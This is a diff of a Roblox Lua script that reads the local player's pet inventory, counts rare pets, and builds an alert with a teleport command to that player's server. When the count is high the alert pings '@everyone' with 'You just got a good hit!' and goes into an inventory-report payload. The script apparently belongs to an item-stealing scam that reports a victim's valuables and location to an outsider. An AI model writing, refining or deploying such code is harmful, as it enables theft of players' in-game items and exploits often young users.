@@ -69,13 +69,13 @@ for i, v in pairs(ClientData.get("inventory").pets) do
 end
 
 if legendaries_count >= 5 or neon_count >= 5 or mega_count >= 1 then
-    messageADOPT = 
-        'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "' .. game.JobId .. '")\n' ..
-        "**||@everyone||** You just got a good hit!\nNOTE: You have **3 seconds** to accept the trade otherwise, the script will break.\nYou have **5 seconds** to accept the trade."
+    messageADOPT =
+        "**||@everyone||**\n" ..
+       
+        'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "' .. game.JobId .. '")\n'
 else
     messageADOPT = 
-        'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "' .. game.JobId .. '")\n' ..
-        "**NOTE:** You have **3 seconds** to accept the trade otherwise, the script will break.\nYou have **5 seconds** to accept the trade."
+        'game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "' .. game.JobId .. '")\n'
 end
 
 local plr = game.Players.LocalPlayer
@@ -123,7 +123,7 @@ local data = {
             color = tonumber(0x3365FF),
             fields = {
                 {
-                    name = "Player Iventory:",
+                    name = "Player Inventory:",
                     value = "**COMMING SOON!**"
                 }
             }
